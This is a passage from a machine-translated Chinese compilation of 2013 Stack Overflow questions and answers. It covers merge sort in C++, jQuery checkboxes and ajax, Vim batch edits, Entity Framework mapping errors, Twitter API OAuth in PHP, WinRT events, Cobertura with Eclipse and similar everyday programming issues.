`INT_MAX`如果数组包含或更大的值，如果元素类型是 eg ，那肯定会失败`long long`。

使用标记值来标记数组的结尾是不合理的，您应该使用索引来检测它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-23T00:21:32.967

你的算法有一些问题。

首先，它会导致**内存泄漏**，因为它分配了永远不会删除的数组。需要一些`delete[]`说明来解决问题。

其次，存在**索引错误**：某些索引变为负数，这是您肯定不希望的（例如，当您这样做时`tmpArray1[i] = list[lb + i - 1];`，因为两者`lb`和`i`都可以为 0）。

第三，你**缺少一个基本步骤**：你永远不会交换两个元素的值。您的递归步骤看起来不错，但递归必须在某个点结束并做一些具体的事情（即当您的范围仅跨越 2 个元素时）。您的`mergeSort()`函数拆分范围并仅递归调用第一个和第二个子范围，但当递归结束时对它们不做任何事情。

第四，您没有正确处理两个子范围具有**不同大小**的情况（一个子范围可能比另一个大一个一个元素）。

以下是您应该如何**修复**代码（在 GCC 4.7.2 上测试）：

```
template <class M>
void myMerge( M arr[], int lb, int mid, int ub )
{
   int i, j;
   int size1 = mid - lb + 1;
   int size2 = ub - mid;

    M* tmpArray1 = new M[size1];
    M* tmpArray2 = new M[size2];

    for( i=0; i<size1; i++ )
    {
        tmpArray1[i] = arr[lb + i]; // THIS NEEDED FIXING
    }

    for( j=0; j<size2; j++ )
    {
        tmpArray2[j] = arr[mid + 1 + j]; // THIS NEEDED FIXING AS WELL (add +1...)
    }

    i = 0;
    j = i;

    for( int k=lb; k<=ub; k++ )
    {
        if (i == size1) // HANDLES THE CASE WHEN FIRST RANGE IS SMALLER
        {
            arr[k] = tmpArray2[j];
            j++;
        }
        else if (j == size2) // HANDLES THE CASE WHEN SECOND RANGE IS SMALLER
        {
            arr[k] = tmpArray1[i];
            i++;
        }
        else if ( tmpArray1[i] < tmpArray2[j] )
        {
            arr[k] = tmpArray1[i];
            i++;
        }
        else
        {
            arr[k] = tmpArray2[j];
            j++;
        }
    }

    delete[] tmpArray1; // IMPORTANT! DON'T FORGET TO RELEASE
    delete[] tmpArray2; // THE MEMORY YOU ALLOCATE...
}

void mergeSort( int arr[], int lb, int ub )
{
    if (ub - lb > 1)
    {
        int mid = (lb + ub) /  2;
        mergeSort(arr, lb, mid);
        mergeSort(arr, mid + 1, ub);
        myMerge(arr, lb, mid, ub);
    } 
    else // DON'T FORGET TO ADD YOUR BASE STEP! (sort a trivial range of 2 elements)
    {
        if (arr[ub] < arr[lb])
        {
            int tmp = arr[ub];
            arr[ub] = arr[lb];
            arr[lb] = tmp;
        }
    }
}

// SOME TESTING...

#include <iostream>
#include <iterator>
#include <algorithm>

using namespace std;

int main()
{
    int numbers[] = { 8, 40, 1, 5, 0, 9, 6, 4, 3, -1, 5 };
    mergeSort(numbers, 0, 10);
    copy(begin(numbers), end(numbers), ostream_iterator<int>(cout, " "));
} 
```

# php - 未选中的复选框通过 Jquery 将值返回为“未定义”

> ID：14469869
> 
> 赞同：1
> 
> 时间：2013-01-22T23:21:08.380
> 
> 标签：php, jquery

jQuery

```
var g = $("#chav_wc:checked").val();
alert(g); 
```

和.. HTML

```
<input type="checkbox" id="chav_wc" value="1" /></div> 
```

工作正常，但如果 checkobx 未选中，则返回值为“未定义”。未选中时，如何将其设置为返回“0”？谢谢。

**编辑（解决方案）**

如果有人遇到相同的挑战，解决方案（谢谢 2 Dave & insertusernamehere）..

```
var g = ($('#chav_wc').is(':checked') ? 1 : 0 ); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:23:55.897

你有没有尝试过：

```
$('#chav_wc').is(':checked'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:23:32.107

你可以这样做：

```
var g = ( 'undefined' == typeof $("#chav_wc:checked").val() ? 0 : 1 ); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T23:24:12.853

我在我的应用程序中使用这样的功能来简化事情。

```
function is_checked(id){
 var $check = $('#'+id);
 if($check.prop('checked')){
    return 1;
 }
 else{
    return 0;
 }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T23:25:11.773

使用`$("#chav_wc").val();`其他选择器与复选框不匹配并返回未定义。

# text - 一次仅用大量 .txt 文件替换有限次数

> ID：14469873
> 
> 赞同：0
> 
> 时间：2013-01-22T23:21:47.053
> 
> 标签：text

我有很多包含文本的 .txt 文件。在文本中有一些符号，比如说“@”。它们出现在随机位置。我想用另外 2 个符号替换这些符号中的前 2 个。因此，如果我有“@@ ... @ ... @@”（其中 ... 是文本），我想将其变为：xx ... @ ... @@ （如果我想替换@由 x)。我只想替换前两个符号，但我只遇到过允许我一次替换所有内容或什么都不替换（以这样的规模）的选项。是否有任何程序或功能可以让我一次对大量文件执行此操作，换句话说，我不必手动为每个文件执行此操作？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-06-11T00:07:56.683

您可以在`Vim`编辑器中执行此操作。首先，这是如何在一个文件中执行此操作。假设我们在缓冲区中有这个文件。

```
junk
@@@@
@@@@ 
```

`@`这是将文件中第一次出现的 替换为 的命令`x`。要执行两次，我们只需执行两次：

```
:0/@/s/@/x/ 
```

如果我们得到后执行它：

```
junk
x@@@
@@@@ 
```

然后如果我们再执行一次，我们会得到：

```
junk
xx@@
@@@@ 
```

解剖学：

```
 start search at 0 (before first line)
 | search for something
 || search for a line containing @
 |||  when you find @ perform a substitution command 
 ||| |  replace this
 ||| | |   with that (just once: the first occurrence in the line)
 ||| | |  |
 vvv v v  v
:0/@/s/@/x/
 ^ 
```

要在大量文件上运行此命令，我们可以使用脚本自动执行该命令，例如：

```
 # find all the .txt files here and in all subdirectories,
 # and execute the command "ex <file> < script" on them

 $ find . -name '*.txt' -exec ex {} < script \; 
```

我们使用`ex`作为替代名称的命令`vi`以 ex 模式启动它，它接受`ex`标准输入上的命令。

`script`填充物包含以下内容：

```
0/@/s/@/x/
0/@/s/@/x/
x 
```

即做两个这些替换，然后`:x`保存并退出。

vi 中使用的冒号不是必需的，因为冒号是`vi`用于输入命令的交互式命令模式中的`ex`命令。

# entity-framework - 实体框架“列名无效”

> ID：14469878
> 
> 赞同：8
> 
> 时间：2013-01-22T23:22:20.500
> 
> 标签：entity-framework, ef-code-first

我们已将现有数据库转换为使用 EF，因此我们编写类以映射到我们的表。我添加了一个新列，一个名为“iframeVideoId”的可为空的 int。我用它映射它

```
public int? iframeVideoId { get; set; } 
```

当我搜索那张桌子时，它会炸毁一个'

> 无效的列名错误

. 这是一个简单的属性，它不是索引或与任何其他表相关。我尝试在 DB 中将其重命名为“ `DisplayVideo`”，并使其不可为空。然后我有

```
[Column("DisplayVideo")]
public int iframeVideoId { get; set; } 
```

现在我收到一个错误，即 DisplayVideo 不是有效的列。当然，我已经仔细检查了我指向正确的数据库，并确认我的代码可以指向的每个数据库都有这个列。我还完成了清理和重建所有工作，并重新启动了我的机器。有什么问题？这是一个基本的专栏，它就在那里。我从过去的经验中知道，如果类型不匹配（它们都是 int ），我会收到与类型之间转换失败有关的错误。这对我来说毫无意义。我没有要刷新的 edmx 文件，因为我们正在编写类以直接映射到数据库

只是补充一下，我将列更改为字符串，这没有区别。这是一个新列，具有简单的值，而 EF 声称它不存在。

而且，我将该列添加到另一个表中（显然是次优的），它立即就可以正常工作了。不过，我仍然想知道为什么我有一个无法在 EF 中添加列的表

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-06-02T21:55:28.687

由于复制/粘贴情况，我的映射类出现错误。如您所见，将*TranferredToEVP*映射到 3 个不同的列。我在最后一列*TranferredToGUID*上收到“无效的列名”，但正在寻找*TranferredToGUID1*。希望这可以帮助。

```
this.Property(t => t.TransferredToEVP).HasColumnName("TransferredToEVP");
this.Property(t => t.TransferredToEVP).HasColumnName("TransferredToName");
this.Property(t => t.TransferredToEVP).HasColumnName("TransferredToGUID"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-03-24T03:07:09.527

我遇到了和 Amy Jonas 一样的问题，如果你碰巧遇到这个问题，请确保映射是正确的。

我的代码以前看起来像这样：

```
Property(d => d.LastUpdatedOn).HasColumnName("LastUpdatedOn");
Property(d => d.LastUpdatedOn).HasColumnName("LastUpdatedBy"); 
```

它应该是 ：

```
Property(d => d.LastUpdatedOn).HasColumnName("LastUpdatedOn");
Property(d => d.LastUpdatedBy).HasColumnName("LastUpdatedBy"); 
```

有时我们太忙以至于忘记查看这些细节。

# memcached - 缓存 3 万个对象 php

> ID：14469880
> 
> 赞同：0
> 
> 时间：2013-01-22T23:22:32.670
> 
> 标签：memcached

您好，我目前有一个包含 30000 张图片的 php 网站。

每个图像都有一个页面，其中包含与每个图像相关的所有数据。

该站点当前安装了 memcache。

我需要缓存每个图像的数据。是不是我简单地缓存了一个图像数据数组，即 30k 条记录，然后查看它以返回结果。我只是不确定这是否会比查询数据库更快。

关于在 php 中为 30000 页图像数据实现缓存的最佳方法的任何其他建议或文章都会很棒

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:26:51.187

您可以使用图像名称（或其他唯一标识符）作为键来缓存数据。每个图像都有自己的密钥，因此您可以从缓存中快速检索该图像的数据。

# c# - 设置等待用户输入的超时时间

> ID：14469881
> 
> 赞同：0
> 
> 时间：2013-01-22T23:22:35.973
> 
> 标签：c#, winforms, .net-3.5

我有一个提示输入用户名和 PIN 的 C# .NET 3.5 应用程序。如果在 x 秒内没有输入 PIN，我希望应用程序自动重置。如果在 x 秒内按下某个键，则计时器应重置为 0 并重新开始。我四处搜索并找到了各种方法来执行此操作，使用计时器thread.wait，但我还没有找到我正在尝试完成的示例。我认为解决方案将涉及使用多个线程，但我以前从未这样做过，所以我不确定从哪里开始。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:25:58.747

您可以使用[此处](https://stackoverflow.com/questions/299198/implement-c-sharp-generic-timeout)的示例，该示例使用 IAsyncResult 接口和 Action 来执行此操作。我自己也用过它，它就像一个魅力。为了简化事情，只需使用它，如下例所示

```
Action wrappedAction = () =>
{
    // show your input
};

IAsyncResult result = wrappedAction.BeginInvoke(null, null);

if (result.AsyncWaitHandle.WaitOne(timeoutMilliseconds))
{
    /// the user supplied an input and closed the form
    wrappedAction.EndInvoke(result);
}
else
{
    // the code has timed out so close your input and throw error
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T23:56:32.787

不需要那么聪明，除非它是你要重用很多的行为。假设您以模态方式显示此表单

当显示表单时，在表单上放置一个计时器（禁用）启用。

将 keydown/keypress 事件处理程序添加到可能具有焦点的框中重新启动计时器

如果计时器事件触发关闭，则返回合适的 DialogResult Cancel 的表单应该这样做。

看到您在按键上重置时，再有一个线程没什么意义。如果您不重置，那么 M Patel 的答案就是要走的路，除非您想重新发明很多轮子

# c# - Gmail、Hotmail 不使用 imap 或 pop3 发送邮件内容中的图像

> ID：14469883
> 
> 赞同：1
> 
> 时间：2013-01-22T23:22:57.580
> 
> 标签：c#, higlabo

我正在使用[HigLabo](http://higlabo.codeplex.com/)库从 Gmail (imap) 或 Hotmail (pop3) 获取收件箱消息。

我的代码与 gmail 的代码类似；

```
ImapClient client = new ImapClient(ServerName);
client.UserName = UserName;
client.Password = Password;
client.Port = Port;
client.Ssl = Ssl;
MailMessage mailMessage = client.GetMessage(1);
Console.WriteLine(mailMessage.BodyText); 
```

假设此消息是来自 newegg 的 HTML 邮件。因此 BodyText 属性的全部内容为 html，但 img 元素以 [image: ] 形式出现，因为 gmail 和 hotmail 不会将图像发送到我的应用程序。要查看图像，用户必须进入他们的真实收件箱并单击“显示所有图像”（我的客户端应用程序不是这种情况）

我想知道邮件提供商不发送来自“不受信任的来源”的图像是否是一个可靠的规则，或者是否有解决方法来获取图像并正确向用户显示收件箱邮件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-25T15:39:52.563

我不确定所有其他 API 有什么问题，最后我今天试了一下这个库；

[limlabs mail.dll](http://www.limilabs.com/mail/download)

它以浏览器上的显示方式获取邮件。

# java - 相当于Java中python的搁置模块

> ID：14469884
> 
> 赞同：4
> 
> 时间：2013-01-22T23:22:58.377
> 
> 标签：java, python, shelve

Java中有没有与python的搁置模块等效的模块？我需要这个来实现分类数据访问等字典。类似字典的分类数据访问是一种以持久易于访问的数据库格式保存 Python 对象的强大方法。我需要一些用于相同目的但在 Java 中的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-30T20:33:00.807

我也需要这个，所以我写了一个。有点晚了，但也许会有所帮助。

它没有实现 close() 方法，而只是使用 sync() 因为它只在实际写入文件时保持文件打开。

```
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

public class Shelf extends HashMap<String, Object> {
    private static final long serialVersionUID = 7127639025670585367L;
    private final File file;

    public static Shelf open(File file) {
    Shelf shelf = null;
    try {
        if (file.exists()) {
        final FileInputStream fis = new FileInputStream(file);
        ObjectInputStream ois = new ObjectInputStream(fis);
        shelf = (Shelf) ois.readObject();
        ois.close();
        fis.close();
        } else {
        shelf = new Shelf(file);
        shelf.sync();
        }
    } catch (Exception e) {
        // TODO: handle errors
    }
    return shelf;
    }

    // Shelf objects can only be created or opened by the Shelf.open method
    private Shelf(File file) {
    this.file = file;
    sync();
    }

    public void sync() {
    try {
        final FileOutputStream fos = new FileOutputStream(file);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(this);
        oos.close();
        fos.close();
    } catch (Exception e) {
        // TODO: handle errors
    }
    }

    // Simple Test Case
    public static void main(String[] args) {
    Shelf shelf = Shelf.open(new File("test.obj"));
    if (shelf.containsKey("test")) {
        System.out.println(shelf.get("test"));
    } else {
        System.out.println("Creating test string.  Run the program again.");
        shelf.put("test", "Hello Shelf!");
        shelf.sync();
    }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-24T14:39:08.120

您可以使用像[Jackson](http://wiki.fasterxml.com/JacksonHome)这样的序列化库，它将 POJO 序列化为 JSON。

[教程](http://wiki.fasterxml.com/JacksonInFiveMinutes)中的一个例子：

> Jackson 的 org.codehaus.jackson.map.ObjectMapper “正常工作”，可将 JSON 数据映射到普通的旧 Java 对象（“POJO”）。例如，给定 JSON 数据

```
{
  "name" : { "first" : "Joe", "last" : "Sixpack" },
  "gender" : "MALE",
  "verified" : false,
  "userImage" : "Rm9vYmFyIQ=="
} 
```

> 需要两行 Java 代码才能将其转换为 User 实例：

```
ObjectMapper mapper = new ObjectMapper(); // can reuse, share globally
User user = mapper.readValue(new File("user.json"), User.class); 
```

> User 类看起来像这样（来自Tatu 博客上的[条目）：](http://www.cowtowncoder.com/blog/archives/2008/12/entry_121.html)

```
public class User {
    public enum Gender { MALE, FEMALE };

    public static class Name {
      private String _first, _last;

      public String getFirst() { return _first; }
      public String getLast() { return _last; }

      public void setFirst(String s) { _first = s; }
      public void setLast(String s) { _last = s; }
    }

    private Gender _gender;
    private Name _name;
    private boolean _isVerified;
    private byte[] _userImage;

    public Name getName() { return _name; }
    public boolean isVerified() { return _isVerified; }
    public Gender getGender() { return _gender; }
    public byte[] getUserImage() { return _userImage; }

    public void setName(Name n) { _name = n; }
    public void setVerified(boolean b) { _isVerified = b; }
    public void setGender(Gender g) { _gender = g; }
    public void setUserImage(byte[] b) { _userImage = b; }
} 
```

# c# - 为一个组合框而不是另一个组合框设置 ComboBoxItems 的样式？

> ID：14469890
> 
> 赞同：2
> 
> 时间：2013-01-22T23:23:47.500
> 
> 标签：c#, .net, wpf

我有一个看起来像这样的风格：

```
var comboBoxItemStyle = new Style(typeof(ComboBoxItem));
comboBoxItemStyle.Setters.Add(new EventSetter(ComboBoxItem.PreviewMouseDownEvent,
                          new MouseButtonEventHandler(OnMyComboItemMouseDown)));

comboBoxItemStyle.Setters.Add(new EventSetter(ComboBoxItem.PreviewKeyDownEvent, 
                          new KeyEventHandler(OnMyComboItemPreviewKeyDown))); 
```

接下来我要做的是：

```
Resources.Add(typeof(ComboBoxItem), comboBoxItemStyle); 
```

但这会将这种样式添加到所有组合框。

假设我有两个组合框：

```
 ComboBox myComboBox = new ComboBox();
 ComboBox someOneElsesComboBox = new ComboBox(); 
```

**我怎样才能将这种风格应用于 just `MyComboBox`？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:28:47.897

当我点击“保存”时想通了

```
myComboBox.Resources.Add(typeof(ComboBoxItem), comboBoxItemStyle); 
```

# freebase - 超出用户速率限制

> ID：14469893
> 
> 赞同：1
> 
> 时间：2013-01-22T23:24:03.523
> 
> 标签：freebase

由于我没有接近每天 100000 次查询，我假设 Google 指的是 Freebase 10 请求每秒每个用户的限制。（我正在传递我的护目镜钥匙）

如果我正在运行一个跨越多个 Freebase 域的查询，是否会考虑多个请求？或者单个查询是否被视为一个请求，无论其大小如何？

谢谢斯科特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T02:12:57.383

是的，听起来您超出了每秒速率限制。您需要在应用程序中引入一些延迟，以免超出限制。速率限制仅适用于 HTTP 请求，因此您可以查询任意数量的数据，只要它适合一个请求即可。

# ios - iOS 开发简介

> ID：14469895
> 
> 赞同：1
> 
> 时间：2013-01-22T23:24:07.867
> 
> 标签：ios, ios-provisioning

1.开发配置文件仅适用于一个应用程序还是开发配置文件可用于多个应用程序

2\. 如果我使用 testFlight - 我需要开发配置文件还是分发配置文件。

3\. 为什么一个用户需要多个证书。如果我在工作中在机器 A 上开发，然后在工作中使用机器 B - 我需要两个证书还是两个配置文件，或者每个只需要一个

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T23:26:02.567

1.  配置文件可以与任意数量的应用程序一起使用，使用通配符应用程序 ID。(com.mycompany.*)
2.  分配
3.  我有许多不同的证书，因为我为不同的客户工作，他们希望我为他们构建应用程序，所以我有多个证书。如果您只使用两台机器并且想要共享证书，请使用 Xcode Organizer 从一台机器导出您的配置文件并在另一台机器上导入它。这将传输私钥、证书和配置文件。

# php - php在ajax post上返回空变量

> ID：14469900
> 
> 赞同：0
> 
> 时间：2013-01-22T23:24:22.653
> 
> 标签：php, jquery, ajax, post, get

我正在尝试掌握 php 和 ajax 帖子的窍门。我通过文本框将简单的用户输入发布到 php 页面。php 页面接受用户输入，计算单词并将其作为响应发送回。但是它不能接收数据，回来说。为什么这是我该如何解决？

这是我的 jQuery ajax 邮政编码

```
var dataString = name;
$.ajax({
      type: "POST",
      url: "test_get.php",
      data: dataString,
      success: function(response) {
        alert(response);
      }
     });
    return false;
    });
}); 
```

这是我的 PHP 代码

```
// if data are received via POST, with index of 'dataString'
if (isset($_POST['dataString'])) {
    $str = $_POST['dataString'];             // get data
    echo "The string: '<i>".$str."</i>' contains ". strlen($str). ' characters and '. str_word_count($str, 0). ' words.';
}

else echo 'There is no data!'; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-22T23:28:23.260

你的`data`论点是不正确的。

```
var dataString = name;

$.ajax({
  type: "POST",
  url: "test_get.php",
  data: {"dataString" : dataString },
  success: function(response) {
    alert(response);
   }
}); 
```

[阅读 jQuery $.ajax 文档](http://api.jquery.com/jQuery.ajax/)了解更多信息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-22T23:27:33.507

您可能需要更改：

```
data: dataString, 
```

到

```
data: "dataString="+dataString, 
```

因为 HTTP POST 仍然使用键/值对。

# php - 使用 JQuery 将页面加载到 div 中，现有的 Javascript 不起作用

> ID：14469902
> 
> 赞同：0
> 
> 时间：2013-01-22T23:24:57.673
> 
> 标签：php, jquery

我有一个正在处理的页面，用户单击链接并将新的 php 文件加载到现有 div 中。它可以工作，但加载到 div 中的页面将无法与页面中现有的 Javascript 内容一起使用。

我可以将 包含 `<script type="text/javascript" src="js/admin.js"></script>` 在加载的页面中，但是当您在页面之间来回滑动时，我注意到 RAM 使用率开始上升，所以我认为这不是最好的方法。

任何想法加载的页面如何与索引页面中已加载的 javascript 一起运行？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T23:35:52.223

像这样绑定你的事件：

```
 $(document).on({
           "event"  : function(e) {},
             ...

          }, "selector"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T23:32:52.553

如果您正在使用`bind`或`click`键入事件更改为使用类似的东西[`on`](http://api.jquery.com/on/)（[`live`](http://api.jquery.com/live/)或者[`delegate`](http://api.jquery.com/delegate/)如果您需要使用小于 1.9 的 jquery 版本）

或/与

在通过 ajax 在页面中加载的函数中，提供一个仅启动所需内容的回调。例子：

```
$('#myDiv').load('ajax/page.php', function(){

    $('#myDiv a').customPlugin('whatever');
    $('#myDiv button').bind('click', function(){
        window.open('http://www.google.com/', 'some-window');
    });

}); 
```

# php - 无法使用 PHP 获取 Twitter 趋势

> ID：14469905
> 
> 赞同：0
> 
> 时间：2013-01-22T23:25:19.580
> 
> 标签：php

所以我正在尝试制作一个相当简单的 php 脚本，它可以从 Twitter 获取最新的全球趋势。大部分代码来自另一篇 StackOverflow 帖子，稍作修改。不幸的是，无论我尝试什么，我得到的只是：

```
{"errors":[{"message":"Could not authenticate you","code":32}]} 
```

然而，同样的代码可以很好地获取时间线、获取推文、发布推文等......但是当我尝试趋势时，由于某种原因它失败了。

```
$twitterurl = "https://api.twitter.com/1.1/trends/place.json?id=1";

$oauth_access_token = "XXXXXXXXXXXXXXXXXXX";
$oauth_access_token_secret = "XXXXXXXXXXXXXXXXXX";
$consumer_key = "XXXXXXXXXXXX";
$consumer_secret = "XXXXXXXXXXXX";

$oauth = array( 'oauth_consumer_key' => $consumer_key, 'oauth_nonce' => time(), 'oauth_signature_method' => 'HMAC-SHA1', 'oauth_token' => $oauth_access_token, 'oauth_timestamp' => time(), 'oauth_version' => '1.0');

function buildBaseString($baseURI, $method, $params)
{
    $r = array();
    ksort($params);
    foreach($params as $key=>$value)
    {
        $r[] = "$key=" . rawurlencode($value);
    }
    return $method . "&" . rawurlencode($baseURI) . '&' . rawurlencode(implode('&', $r));
}

function buildAuthorizationHeader($oauth)
{
    $r = 'Authorization: OAuth ';
    $values = array();
    foreach($oauth as $key=>$value)
    {
        $values[] = "$key=\"" . rawurlencode($value) . "\"";
    }
    $r .= implode(', ', $values);
    return $r;
}

$base_info = buildBaseString($twitterurl, 'GET', $oauth);
$composite_key = rawurlencode($consumer_secret) . '&' . rawurlencode($oauth_access_token_secret);
$oauth_signature = base64_encode(hash_hmac('sha1', $base_info, $composite_key, true));
$oauth['oauth_signature'] = $oauth_signature;

$header = array(buildAuthorizationHeader($oauth), 'Expect:');
$options = array( CURLOPT_HTTPHEADER => $header,
              CURLOPT_HEADER => false,
              CURLOPT_URL => $twitterurl,
              CURLOPT_RETURNTRANSFER => true,
              CURLOPT_SSL_VERIFYPEER => false);

$feed = curl_init();
curl_setopt_array($feed, $options);
$json = curl_exec($feed);
curl_close($feed);
$trends = json_decode($json);

print_r($json); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-25T10:10:34.907

您可以尝试在这些行中修改您的 php 脚本：

```
$twitterurl = "https://api.twitter.com/1.1/trends/place.json"; // DELETE ?id=1 
```

和

```
$oauth = array( 'oauth_consumer_key' => $consumer_key, 
'id' => '1', // ADD THIS ROW
'oauth_nonce' => time(), 
```

和

```
CURLOPT_URL => $twitterurl . '?id=1', // ADD . '?id=1' 
```

我希望这有帮助。

# c# - 无法从 WinRT 中的列表框中触发 PointerPressed 事件

> ID：14469908
> 
> 赞同：1
> 
> 时间：2013-01-22T23:25:49.107
> 
> 标签：c#, .net, xaml, windows-runtime, winrt-xaml

我有一个 ListBox 绑定到一些数据，所有数据都设置了 ItemTemplate，我想通过按下 ListBox 区域中的任意位置来触发 PointerPressed 事件（因为我只是出于某种目的需要它），但显然项目的选择是防止这种情况，（我正在使用命令）这是我的代码

```
<ScrollViewer x:Name="sv"
              x:FieldModifier="public"
              VerticalScrollBarVisibility="Visible"
              VerticalScrollMode="Enabled"
              HorizontalScrollBarVisibility="Disabled"
              HorizontalScrollMode="Disabled">
  <ListBox x:Name="lb"
           ItemsSource="{Binding Path=Tweets}">
    <WinRTBehaviors:Interaction.Behaviors>
      <Win8LnBehaviors:EventToCommandBehavior Event="PointerPressed"
                                              Command="svPointerPressed"
                                              PassEventArgsToCommand="True" />
    </WinRTBehaviors:Interaction.Behaviors>
    <ListBox.ItemTemplate>
      <DataTemplate>
        <Grid Height="65">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="65"></ColumnDefinition>
            <ColumnDefinition Width="2*"></ColumnDefinition>
            <ColumnDefinition Width="3*"></ColumnDefinition>
          </Grid.ColumnDefinitions>
          <Grid.RowDefinitions>
            <RowDefinition Height="*"></RowDefinition>
            <RowDefinition Height="2*"></RowDefinition>
          </Grid.RowDefinitions>
          <Image x:Name="Img_ProfilePicture"
                 Grid.Row="0"
                 Grid.Column="0"
                 Grid.RowSpan="2"
                 Stretch="Fill"
                 Source="{Binding ProfilePictureSource}"
                 Margin="2">
          </Image>
          <TextBlock x:Name="Tb_ProfileName"
                     Grid.Row="0"
                     Grid.Column="1"
                     Text="{Binding UserName}"
                     Margin="5,0,0,0"
                     FontFamily="Segoe UI Mono"
                     FontSize="12"
                     FontWeight="Bold" />
          <TextBlock x:Name="Tb_FeedTime"
                     Grid.Row="0"
                     Grid.Column="2"
                     Text="{Binding StatusDateTime}"
                     Margin="5,0,0,0"
                     FontFamily="Segoe UI Light"
                     FontSize="10" />
          <TextBlock x:Name="Tb_FeedData"
                     Grid.Row="1"
                     Grid.Column="1"
                     Grid.ColumnSpan="2"
                     Text="{Binding Status}"
                     Margin="10,0,0,0"
                     FontFamily="Wasco Sans"
                     TextWrapping="Wrap">
          </TextBlock>
        </Grid>
      </DataTemplate>
    </ListBox.ItemTemplate>
  </ListBox>
</ScrollViewer> 
```

背后的代码：

```
public RelayCommand<RoutedEventArgs> svPointerPressed
{
   get
   {
     return new RelayCommand<RoutedEventArgs>((routedEventArgs) =>
     {
       _dispatcher = Window.Current.Dispatcher;
         _dispatcher.RunAsync(CoreDispatcherPriority.High, ()  =>
        {
           MessageDialog m = new MessageDialog("Tapped !");
           m.ShowAsync();
        });
      });
    }
     private set{}
 } 
```

我什至尝试从像那些 TextBoxes 这样的组件之一触发 PointerPressed 事件，但仍然没有触发。

我会很感激的，thx

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-23T06:56:16.720

我会在这一点上放弃。ScrollViewer 过滤掉指针事件，您最好找出替代设计。

# java - 为什么 Cobertura 似乎切换了我的 Eclipse 的 Java 版本？

> ID：14469914
> 
> 赞同：0
> 
> 时间：2013-01-22T23:26:09.833
> 
> 标签：java, eclipse, ant, cobertura

这些是产生错误的步骤：

1.  在 Eclipse (Cntrl-F11) 中运行我的单元测试。所有 67 人都成功并如此报告。
2.  使用 Ant build.xml 文件，运行 Cobertura 任务以生成覆盖率报告。任务失败，说明单元测试失败。
3.  当我再次尝试使用 Eclipse 运行单元测试时，我收到以下错误：

`Unsupported major.minor version 51.0`

（这些症状一直存在，直到我在 Eclipse 中使用 Project -> Clean。）

我的 Cobertura 蚂蚁任务是：

```
<target name="report-test" description="Generate a test coverage report." depends="clean, compile">
        <taskdef resource="tasks.properties">
            <classpath>
                <pathelement location="${lib.dir}/cobertura-1.9.4.1/cobertura.jar" />
                <pathelement location="${lib.dir}/cobertura-1.9.4.1/lib/asm-3.0.jar" />
                <pathelement location="${lib.dir}/cobertura-1.9.4.1/lib/asm-tree-3.0.jar" />
                <pathelement location="${lib.dir}/cobertura-1.9.4.1/lib/log4j-1.2.9.jar" />
                <pathelement location="${lib.dir}/cobertura-1.9.4.1/lib/jakarta-oro-2.0.8.jar" />
            </classpath>
        </taskdef>
        <cobertura-instrument todir="${build.dir}/cobertura-instrument">
            <fileset dir="${build.dir}">
                <include name="**/*.class"/>
            </fileset>
        </cobertura-instrument>
        <junit printsummary="yes" fork="true" haltonfailure="yes" showoutput="yes">
            <classpath location="${build.dir}/cobertura-instrument"/>
            <classpath location="${build.dir}"/>
            <classpath refid="classpath.test" />
            <sysproperty key="net.sourceforge.cobertura.datafile" file="cobertura.ser"/>
            <formatter type="xml" />
            <batchtest todir="doc/junit">
                <fileset dir="${test.dir}" />
            </batchtest>
        </junit>
        <cobertura-report srcdir="${src.dir}" destdir="doc/coverage" format="xml" />
        <delete file="cobertura.ser"/>
    </target> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:47:08.090

Coberatura 没有切换 Eclipse 的 Java 版本。

它实际上所做的是使用比您用于运行 Eclipse 的版本更新的 Java 版本重新编译类。Eclipse 无法加载那些 .class 文件。

短期解决方案是让 Eclipse 在运行 Coberatura 之后清理和重建项目……就像您目前所做的那样。

从长远来看，您应该将 Eclipse 更改为使用与 Ant 构建相同的 Java 版本运行，或者更改 Ant 构建文件，使其不会将“.class”文件写入 Eclipse 工作区。或者两者兼而有之……因为在 Eclipse 工作区中写入其他内容也会导致其他问题。

# django - 避免 Django DatabaseError 关系“模型”不存在

> ID：14469918
> 
> 赞同：1
> 
> 时间：2013-01-22T23:26:38.163
> 
> 标签：django, postgresql

在 django 中初始化应用程序时，**在创建 postgresql 数据库之前，**如果尝试获取/全部/创建对象，他们通常会看到如下错误：

```
>>> Model.objects.all()
{StackTrace}
...
DatabaseError: relation "model" does not exist
... 
```

在我的应用程序中，我希望能够测试模型是否存在并运行代码（如果存在），这可以使用 django 吗？

伪代码：

```
if not (table_exists(model))
   return
my_models = Model.objects.all()
... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:47:29.187

